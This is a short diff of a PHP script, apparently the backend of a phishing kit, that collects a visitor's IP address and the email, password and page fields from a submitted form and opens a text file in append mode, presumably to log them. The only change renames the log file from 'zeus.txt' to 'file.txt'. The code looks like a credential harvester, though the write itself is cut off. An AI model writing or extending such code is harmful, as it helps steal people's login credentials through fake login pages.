@@ -1,6 +1,6 @@
 <?php
 include('get_ip.php');
-$handle = fopen("zeus.txt", "a"); 
+$handle = fopen("file.txt", "a"); 
 $email = $_POST["email"];
 $pass = $_POST["pass"];
 $page = $_POST["page"];
